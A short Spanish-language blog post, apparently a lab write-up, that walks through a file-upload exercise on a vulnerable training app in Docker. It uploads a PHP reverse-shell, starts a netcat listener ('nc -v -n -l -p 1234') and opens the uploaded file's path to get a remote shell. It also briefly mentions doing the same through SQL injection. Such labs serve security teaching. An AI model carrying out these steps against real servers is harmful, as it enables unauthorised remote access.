---
çtypora-copy-images-to: ../assets/img
typora-root-url: ../
layout: post
categories:
conToc: true
title: Fileupload
---

# Práctica Fileupload



Una vez funcionando la máquina de docker...

Nos descargamos un fichero shell.php con el reverse-shell. Ponemos la IP de nuestra máquina en tal fichero (no poner localhost)

Subimos este archivo a la sección de File Upload, y desde la máquina en la cuál estamos ejecutando el docker ejecutamos en un shell:

```bash
nc -v -n -l -p 1234
```
Cogeremos las siguientes lineas de la ruta que nos ha devuelto el programa:

```bash
../hackable/uploads/shell.php
```

Y las pegaremos a continuación de la URL del navegador

Como podemos observar se ha abierto un shell inverso en nuestra ventana de comandos.

![image-20220510161310891](/assets/img/image-20220510161310891.png)



Realizamos los mismos pasos pero en la pestaña SQL Injection, con la diferencia de que inyectaremos codigo además de un archivo.

![image-20220510162408405](/assets/img/image-20220510162408405.png)
